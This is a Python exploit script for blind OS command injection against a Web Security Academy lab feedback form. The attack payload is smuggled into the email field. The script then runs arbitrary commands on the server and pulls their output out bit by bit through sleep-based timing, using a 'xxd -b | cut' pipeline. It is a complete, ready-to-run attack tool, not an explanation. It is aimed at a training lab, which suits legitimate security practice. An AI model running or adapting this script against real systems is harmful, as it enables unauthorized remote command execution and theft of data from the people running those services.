#!/usr/bin/env python3

"""This script will attempt a Blind RCE Exfiltration.
The code is based on the work of Dana, aka SilverStr:
https://danaepp.com/from-exploit-to-extraction-data-exfil-in-blind-rce-attacks
Dana's produced code that exfiltrated the output of the RCE by testing
every character individually. This code instead converts the output of
the RCE to binary and exfiltrates one bit at a time.
Dana's code was partially based on the ideas from Ben (aka NahamSec):
https://www.youtube.com/watch?v=Mt32ZHP4790
"""

import argparse
import time
import urllib.parse
from requests import Session
from requests.adapters import HTTPAdapter


# Setup static vars based on specific target needs

# Extract these from the POST captured in Burp
SESSION = "<your_cookie_here>"
HOST = "<your_host_here>"
CSRF = "<your_csrf_token_here>"

COOKIES = {
    'session': SESSION
}

HEADERS = {
    'Host': f'{HOST}.web-security-academy.net',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Priority': 'u=1, i'
}

URL = f'https://{HOST}.web-security-academy.net/feedback/submit'


def get_bit(cmd: str, pos: int, sleep_time: int,
            session: Session) -> bool:
    """Obtain a single bit from the output of the Blind RCE
    """
    data = (
        f'csrf={CSRF}&name=a&email=b%40d.com||'
        f'if+[+$({cmd}|'
        f'xxd+-b|cut+-d"+"+-f+2-7|tr+-d+"+\n"|'
        f'cut+-c+{pos})+%3d+1+]%3b+'
        f'then+sleep+{sleep_time}%3b+fi||&subject=c&message=d'
    )

    response = session.post(
        URL,
        cookies=COOKIES,
        headers=HEADERS,
        data=data,
    )

    response_time = response.elapsed.total_seconds()
    return response_time > sleep_time


def run_cmd(cmd: str, sleep_time: int) -> None:
    """Perform a RCE on the server by repeatedly sending the command
    and determine if each bit of the output is a 0/1 based on the delay
    """
    encoded_cmd = urllib.parse.quote_plus(cmd)

    # Setup a session to keep the connection pool alive and healthy
    # (faster overall response times)
    with Session() as session:
        adapter = HTTPAdapter(pool_connections=100, pool_maxsize=100)
        session.mount('http://', adapter)
        session.mount('https://', adapter)

        pos = 1
        bits = 0
        bit_num = 8
        while True:
            current_bit = get_bit(encoded_cmd, pos, sleep_time, session)
            if current_bit == 1:
                bit_num -= 1
                bits += 1 << bit_num
            elif current_bit == 0:
                bit_num -= 1
            else:
                pass
            if bit_num == 0:
                if bits == 0:
                    break
                print(chr(bits), end="", flush=True)
                bit_num = 8
                bits = 0
            pos += 1


def main() -> None:
    """Take a command as input and perform Blind RCE Exfiltration
    """
    parser = argparse.ArgumentParser(description="Process some arguments.")
    parser.add_argument("cmd", help="Command to run on remote host")
    parser.add_argument("--sleep", type=int,
                        help="How long to sleep. (Default 10 seconds)",
                        default=10)
    args = parser.parse_args()

    try:
        start_time = time.time()
        run_cmd(args.cmd, args.sleep)
        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"\n\nIt took {elapsed_time:.1f} seconds to run.")
    except KeyboardInterrupt:
        print("Aborting...")


if __name__ == "__main__":
    main()
